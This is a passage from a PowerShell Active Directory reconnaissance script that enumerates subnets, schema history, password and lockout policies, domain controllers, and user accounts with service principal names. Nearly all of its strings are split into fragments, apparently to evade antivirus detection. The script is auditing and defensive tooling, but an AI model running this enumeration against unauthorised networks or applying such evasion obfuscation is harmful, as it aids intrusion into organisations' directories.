                $Obj | Add-Member -MemberType NoteProperty -Name ('whenC'+'rea'+'ted') -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name ('when'+'Ch'+'anged') -Value $_.whenChanged
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $SearchPath = ('C'+'N'+'=Su'+'b'+'nets'+',CN=Sites')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ('(obj'+'e'+'ct'+'C'+'las'+'s=subnet'+')')
        $ObjSearcher.SearchScope = ('S'+'ub'+'tree')

        Try
        {
            $ADSubnets = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[G'+'et'+'-ADRSubn'+'et]'+' '+'Error while'+' enu'+'meratin'+'g'+' Su'+'bnet Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Sit'+'e') -Value $((([string] $_.Properties.siteobject) -Split ",")[0] -replace ('CN'+'='),'')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Nam'+'e') -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name ('Descripti'+'o'+'n') -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name ('whenCr'+'ea'+'ted') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ('whenCh'+'a'+'ng'+'ed') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}

# based on https://blogs.technet.microsoft.com/heyscriptingguy/2012/01/05/how-to-find-active-directory-schema-update-history-by-using-powershell/
Function Get-ADRSchemaHistory
{
<#
.SYNOPSIS
    Returns the Schema History of the current (or specified) domain.

.DESCRIPTION
    Returns the Schema History of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE).schemaNamingContext) -SearchScope OneLevel -Filter * -Property DistinguishedName, Name, ObjectClass, whenChanged, whenCreated )
        }
        Catch
        {
            Write-Warning ('[Get-ADRSchema'+'H'+'istory] '+'Error whi'+'l'+'e'+' e'+'numer'+'ating Sc'+'he'+'ma '+'Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj = [ADRecon.ADWSClass]::SchemaParser($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ('('+'obj'+'ectC'+'l'+'ass=*)')
        $ObjSearcher.PropertiesToLoad.AddRange((('d'+'istin'+'guishednam'+'e'),('n'+'ame'),('ob'+'j'+'ec'+'tclass'),('whe'+'nchan'+'ged'),('w'+'hencrea'+'ted')))
        $ObjSearcher.SearchScope = ('On'+'eLevel')

        Try
        {
            $ADSchemaHistory = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get'+'-AD'+'RS'+'chemaH'+'i'+'sto'+'r'+'y] Err'+'o'+'r'+' '+'while e'+'numera'+'ting '+'Schem'+'a Ob'+'je'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj = [ADRecon.LDAPClass]::SchemaParser($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($ADSchemaObj)
    {
        Return $ADSchemaObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDefaultPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Default Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Default Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning ('[Get-'+'A'+'DRDefau'+'ltPassw'+'ordPo'+'li'+'cy] Er'+'ror'+' whil'+'e enumeratin'+'g the '+'Def'+'ault Pass'+'word Poli'+'cy')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( ('Enforc'+'e'+' pas'+'swo'+'rd histor'+'y'+' ('+'passwor'+'ds'+')'), $ADpasspolicy.PasswordHistoryCount, "4", ('R'+'eq.'+' 8.2.5'), "8", ('Con'+'trol:'+' 042'+'3'), ('24 '+'or '+'mo'+'re'),
            ('M'+'a'+'ximum p'+'assword'+' age '+'(d'+'ays)'), $ADpasspolicy.MaxPasswordAge.days, '90', ('R'+'eq.'+' 8.2.4'), '90', ('Co'+'ntro'+'l: 042'+'3'), ('1 '+'to 6'+'0'),
            ('Minim'+'um pass'+'wor'+'d a'+'ge '+'(days)'), $ADpasspolicy.MinPasswordAge.days, ('N/'+'A'), "-", "1", ('Contro'+'l: 042'+'3'), ('1 or'+' mo'+'re'),
            ('Minim'+'u'+'m'+' pa'+'ss'+'word'+' length (cha'+'ra'+'c'+'ters'+')'), $ADpasspolicy.MinPasswordLength, "7", ('R'+'eq'+'. 8.2.3'), '13', ('Cont'+'rol: 04'+'2'+'1'), ('14 o'+'r mor'+'e'),
            ('Pass'+'word mu'+'st '+'meet c'+'omplexi'+'ty req'+'u'+'ir'+'ements'), $ADpasspolicy.ComplexityEnabled, $true, ('Req. '+'8'+'.2.'+'3'), $true, ('C'+'ontrol'+': 04'+'21'), $true,
            ('St'+'o'+'re '+'pass'+'word '+'us'+'ing revers'+'ibl'+'e encry'+'ption for all u'+'sers i'+'n t'+'he dom'+'ain'), $ADpasspolicy.ReversibleEncryptionEnabled, ('N'+'/A'), "-", ('N/'+'A'), "-", $false,
            ('Acc'+'ount lockou'+'t '+'du'+'ratio'+'n (mins)'), $ADpasspolicy.LockoutDuration.minutes, ('0 '+'(manu'+'a'+'l '+'u'+'nlock)'+' or 30'), ('Req. 8'+'.1.'+'7'), ('N'+'/A'), "-", ('1'+'5 '+'or mo'+'re'),
            ('Accoun'+'t'+' loc'+'ko'+'ut threshold (attempts'+')'), $ADpasspolicy.LockoutThreshold, ('1 '+'to '+'6'), ('Req. '+'8'+'.1.6'), ('1 to'+' 5'), ('C'+'on'+'tr'+'ol: 14'+'03'), ('1'+' to'+' 10'),
            ('Reset acco'+'un'+'t l'+'ock'+'ou'+'t c'+'o'+'unter af'+'ter'+' (m'+'ins)'), $ADpasspolicy.LockoutObservationWindow.minutes, ('N'+'/A'), "-", ('N/'+'A'), "-", ('1'+'5 or m'+'or'+'e') )

            Remove-Variable ADpasspolicy
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {
        If ($ObjDomain)
        {
            #Value taken from https://msdn.microsoft.com/en-us/library/ms679431(v=vs.85).aspx
            $pwdProperties = @{
                ('DO'+'MAIN_P'+'AS'+'SWO'+'RD_C'+'O'+'MPLEX') = 1;
                ('DOMAI'+'N_'+'PA'+'SSWORD_N'+'O_ANO'+'N_CHA'+'N'+'GE') = 2;
                ('DOMAIN_PASSWO'+'R'+'D_NO_CLE'+'A'+'R'+'_'+'CHANGE') = 4;
                ('DOMAI'+'N_'+'LOC'+'KOUT_A'+'DMINS') = 8;
                ('D'+'OM'+'AIN_PASS'+'WO'+'RD_S'+'TO'+'RE_CLEARTEX'+'T') = 16;
                ('DOMAI'+'N_'+'REFUSE_P'+'AS'+'SWORD_CHANGE') = 32
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties[('D'+'OMAIN'+'_'+'PA'+'SSW'+'ORD_CO'+'MPLEX')]) -eq $pwdProperties[('DOMAIN'+'_PAS'+'S'+'WORD_COMP'+'LEX')])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties[('DOM'+'AIN_PAS'+'SWORD'+'_STORE'+'_C'+'L'+'EA'+'RTE'+'XT')]) -eq $pwdProperties[('DOMAIN_PA'+'SS'+'W'+'ORD_'+'STORE_C'+'L'+'EARTE'+'X'+'T')])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutduration.value)/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( ('Enforce '+'pa'+'sswo'+'rd histor'+'y ('+'passwords)'), $ObjDomain.PwdHistoryLength.value, "4", ('Req.'+' 8.'+'2.5'), "8", ('Con'+'tro'+'l: 0423'), ('24 or mo'+'r'+'e'),
            ('Maximu'+'m pa'+'ssw'+'ord age'+' (days'+')'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000), '90', ('Re'+'q. '+'8.2.4'), '90', ('Co'+'ntro'+'l'+': 0'+'423'), ('1 to '+'6'+'0'),
            ('Mi'+'nim'+'u'+'m '+'p'+'assword age (days)'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.minpwdage.value) /-864000000000), ('N/'+'A'), "-", "1", ('Con'+'trol'+':'+' 042'+'3'), ('1 o'+'r m'+'ore'),
            ('Mini'+'m'+'u'+'m pass'+'wor'+'d'+' length (c'+'harac'+'t'+'ers'+')'), $ObjDomain.MinPwdLength.value, "7", ('R'+'eq.'+' 8.2.3'), '13', ('Con'+'trol:'+' 0421'), ('1'+'4 or'+' '+'more'),
            ('Pa'+'ss'+'word must meet '+'complexity'+' re'+'qu'+'i'+'r'+'e'+'ment'+'s'), $ComplexPasswords, $true, ('R'+'e'+'q. 8.2.3'), $true, ('Cont'+'rol:'+' 0421'), $true,
            ('Store passw'+'or'+'d using reve'+'rsi'+'ble'+' '+'e'+'ncrypt'+'i'+'on'+' '+'f'+'or all'+' user'+'s in'+' th'+'e '+'d'+'om'+'ai'+'n'), $ReversibleEncryption, ('N/'+'A'), "-", ('N/'+'A'), "-", $false,
            ('Acc'+'ount '+'lock'+'o'+'ut '+'dura'+'t'+'io'+'n '+'(mins)'), $LockoutDuration, ('0 (manual'+' '+'unl'+'ock)'+' '+'or'+' 30'), ('R'+'eq. 8.1'+'.7'), ('N'+'/A'), "-", ('15 or '+'m'+'ore'),
            ('Ac'+'co'+'unt l'+'ockout thres'+'hold (atte'+'mpts'+')'), $ObjDomain.LockoutThreshold.value, ('1 to '+'6'), ('Req.'+' '+'8.1.6'), ('1 '+'to 5'), ('Con'+'trol'+': 1403'), ('1 t'+'o'+' 10'),
            ('R'+'ese'+'t'+' ac'+'count '+'lockou'+'t'+' co'+'u'+'nter af'+'ter (mi'+'ns'+')'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutobservationWindow.value)/-600000000), ('N'+'/A'), "-", ('N'+'/A'), "-", ('15 o'+'r '+'more') )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
        {
            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Polic'+'y') -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'u'+'r'+'rent '+'Value') -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType NoteProperty -Name ('PC'+'I '+'DSS Req'+'uireme'+'n'+'t') -Value $ObjValues[$i+2]
            $Obj | Add-Member -MemberType NoteProperty -Name ('PC'+'I '+'DSS '+'v3.'+'2.1') -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType NoteProperty -Name ('A'+'SD ISM') -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType NoteProperty -Name ('2'+'018 ISM Cont'+'ro'+'ls') -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType NoteProperty -Name ('CIS'+' Benchmark '+'20'+'1'+'6') -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ObjValues
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ('AD'+'WS'))
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-AD'+'R'+'Fine'+'Gr'+'aine'+'dPasswor'+'dPol'+'icy'+'] Error'+' w'+'hi'+'l'+'e '+'enu'+'m'+'era'+'ting'+' the'+' '+'Fine '+'Grain'+'ed '+'Passwor'+'d Pol'+'icy')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_.AppliesTo.Count); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_.AppliesTo[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.TrimStart(",")
                }
                $ObjValues = @(('N'+'ame'), $($_.Name), ('Applies'+' '+'To'), $AppliesTo, ('Enf'+'orce'+' pas'+'s'+'wo'+'rd '+'history'), $_.PasswordHistoryCount, ('Maximum '+'pa'+'ssword ag'+'e '+'(d'+'ays)'), $_.MaxPasswordAge.days, ('Minim'+'um pa'+'s'+'s'+'wor'+'d age (days)'), $_.MinPasswordAge.days, ('M'+'inimum p'+'asswo'+'r'+'d length'), $_.MinPasswordLength, ('Pas'+'sword must meet'+' compl'+'ex'+'ity requ'+'ir'+'emen'+'ts'), $_.ComplexityEnabled, ('St'+'or'+'e '+'password'+' '+'us'+'ing reversible en'+'cryption'), $_.ReversibleEncryptionEnabled, ('Ac'+'c'+'oun'+'t l'+'o'+'ckout duration'+' (min'+'s)'), $_.LockoutDuration.minutes, ('Ac'+'co'+'unt lockout '+'thresho'+'ld'), $_.LockoutThreshold, ('Reset accoun'+'t '+'lockout cou'+'nter a'+'ft'+'e'+'r (mi'+'ns)'), $_.LockoutObservationWindow.minutes, ('Prec'+'edenc'+'e'), $($_.Precedence))
                For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Po'+'licy') -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(ob'+'j'+'ectCla'+'ss=msDS-P'+'ass'+'wordSet'+'tings'+')')
            $ObjSearcher.SearchScope = ('Su'+'btree')
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('['+'G'+'et-A'+'DRF'+'ineGra'+'i'+'n'+'edP'+'as'+'swor'+'dPolicy] Error w'+'hi'+'le en'+'u'+'mer'+'ating '+'the Fine G'+'r'+'aine'+'d'+' P'+'a'+'ssword'+' Poli'+'cy')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCount($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_.Properties.'msds-psoappliesto'.Count); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_.Properties.'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.TrimStart(",")
                    }
                        $ObjValues = @(('Na'+'me'), $($_.Properties.name), ('Appl'+'ies '+'To'), $AppliesTo, ('Enforc'+'e '+'passwo'+'rd h'+'istory'), $($_.Properties.'msds-passwordhistorylength'), ('Maxim'+'um pa'+'ssw'+'ord '+'age (da'+'y'+'s)'), $($($_.Properties.'msds-maximumpasswordage') /-864000000000), ('M'+'in'+'im'+'um '+'p'+'assw'+'or'+'d a'+'ge (days)'), $($($_.Properties.'msds-minimumpasswordage') /-864000000000), ('Mi'+'n'+'imum p'+'ass'+'word'+' length'), $($_.Properties.'msds-minimumpasswordlength'), ('P'+'assword mu'+'st'+' mee'+'t comp'+'lex'+'ity '+'req'+'uirements'), $($_.Properties.'msds-passwordcomplexityenabled'), ('Stor'+'e passwor'+'d us'+'ing re'+'versible '+'encry'+'ptio'+'n'), $($_.Properties.'msds-passwordreversibleencryptionenabled'), ('Ac'+'coun'+'t lo'+'ckout du'+'rati'+'on '+'(m'+'ins'+')'), $($($_.Properties.'msds-lockoutduration')/-600000000), ('Acc'+'ount lock'+'out'+' thre'+'sh'+'ol'+'d'), $($_.Properties.'msds-lockoutthreshold'), ('Reset account lo'+'cko'+'u'+'t c'+'ounter'+' af'+'ter'+' (mins)'), $($($_.Properties.'msds-lockoutobservationwindow')/-600000000), ('Prec'+'eden'+'ce'), $($_.Properties.'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                        {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ('Pol'+'icy') -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDomainController
{
<#
.SYNOPSIS
    Returns the domain controllers for the current (or specified) forest.

.DESCRIPTION
    Returns the domain controllers for the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning ('[G'+'e'+'t-ADRDomainC'+'ontroll'+'er]'+' Er'+'r'+'or whi'+'le '+'enumerat'+'ing DomainCo'+'ntr'+'ol'+'ler Obj'+'e'+'c'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        # DC Info
        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            $DCObj = [ADRecon.ADWSClass]::DomainControllerParser($ADDomainControllers, $Threads)
            Remove-Variable ADDomainControllers
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Do'+'main'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('['+'G'+'et-ADRD'+'o'+'ma'+'in'+'Cont'+'rol'+'l'+'er] Error '+'get'+'ti'+'ng D'+'omain Con'+'t'+'ext')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If ($ADDomain.DomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            $DCObj = [ADRecon.LDAPClass]::DomainControllerParser($ADDomain.DomainControllers, $Threads)
            Remove-Variable ADDomain
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUser
{
<#
.SYNOPSIS
    Returns all users and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all users and/or  service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRUsers
    [bool]

.PARAMETER ADRUserSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [int] $ADRUsers = $true,

        [Parameter(Mandatory = $false)]
        [int] $ADRUserSPNs = $false
    )

    If ($Method -eq ('A'+'DWS'))
    {
        If (!$ADRUsers)
        {
            Try
            {
                $ADUsers = @( Get-ADObject -LDAPFilter ('(&(sa'+'mAccountTy'+'pe='+'805306368)('+'s'+'ervicePr'+'incipalNa'+'me=*'+'))') -ResultPageSize $PageSize -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl )
            }
            Catch
            {
                Write-Warning ('[G'+'et-A'+'D'+'RUse'+'r] '+'Error while enu'+'m'+'erati'+'ng Us'+'erSPN Object'+'s')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,memberOf,middleName,mobile,('ms'+'D'+'S'+'-Allow'+'edToDe'+'legateT'+'o'),('msDS-'+'Suppo'+'rt'+'edEncryptionT'+'y'+'pe'+'s'),Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,servicePrincipalName,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ('[Get'+'-ADRUser] '+'Error'+' while'+' en'+'umerat'+'ing U'+'s'+'e'+'r'+' Objec'+'ts')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                Try
                {
                    $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    $PassMaxAge = $ADpasspolicy.MaxPasswordAge.days
                    Remove-Variable ADpasspolicy
                }
                Catch
                {
                    Write-Warning ('[Get-ADRU'+'ser] E'+'rror retr'+'i'+'e'+'ving Max Pa'+'ssword Age f'+'r'+'o'+'m'+' th'+'e D'+'ef'+'aul'+'t P'+'a'+'ssword Polic'+'y. Usin'+'g'+' value a'+'s 9'+'0 d'+'ays')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj = [ADRecon.ADWSClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj = [ADRecon.ADWSClass]::UserSPNParser($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {
        If (!$ADRUsers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(&(samAccoun'+'tTyp'+'e=8'+'05'+'306'+'36'+'8)(ser'+'vic'+'ePrincipal'+'Name=*)'+')')
            $ObjSearcher.PropertiesToLoad.AddRange((('n'+'ame'),('des'+'c'+'riptio'+'n'),('m'+'em'+'berof'),('sa'+'maccountnam'+'e'),('se'+'r'+'vicep'+'rincipal'+'nam'+'e'),('p'+'rim'+'arygroupi'+'d'),('pwd'+'las'+'t'+'set'),('use'+'r'+'a'+'ccountcontro'+'l')))
            $ObjSearcher.SearchScope = ('S'+'u'+'btree')
            Try
            {
                $ADUsers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('[G'+'et-'+'ADRUs'+'er] Erro'+'r while e'+'nu'+'mera'+'t'+'ing '+'Us'+'erSPN '+'Ob'+'ject'+'s')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(samA'+'cc'+'o'+'untT'+'ype=80530636'+'8'+')')
            # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
            $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]('Da'+'cl')
